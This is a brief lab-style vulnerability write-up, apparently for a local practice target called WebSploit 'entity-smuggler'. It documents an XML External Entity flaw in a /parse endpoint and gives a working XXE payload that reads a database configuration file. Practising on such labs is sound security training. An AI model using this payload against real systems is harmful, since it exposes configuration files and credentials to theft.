# XXE — WebSploit `entity-smuggler`

## Target

http://127.0.0.1:5013

## Endpoint

POST /parse

## Parameter

xml_data

## Vulnerability

XML External Entity (XXE)

## Proof of Concept

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/config/database.conf">
]>
<document>
  <content>&xxe;</content>
</document>
